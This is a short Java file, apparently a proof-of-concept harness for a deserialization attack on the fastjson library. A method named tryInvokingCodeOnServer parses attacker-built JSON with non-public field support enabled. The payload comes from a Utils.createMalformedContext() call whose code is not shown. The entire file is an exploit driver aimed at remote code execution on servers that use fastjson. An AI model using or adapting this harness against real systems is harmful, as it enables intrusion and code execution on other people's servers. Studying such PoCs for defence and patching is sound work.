package com.fastJsonAttack;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc {
    public static void tryInvokingCodeOnServer(String json) {
        JSON.parseObject(json, Object.class, new ParserConfig(), Feature.SupportNonPublicField);
    }

    public static void main(String[] args){
        try {
            String malformedContext = Utils.createMalformedContext();
            tryInvokingCodeOnServer(malformedContext);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
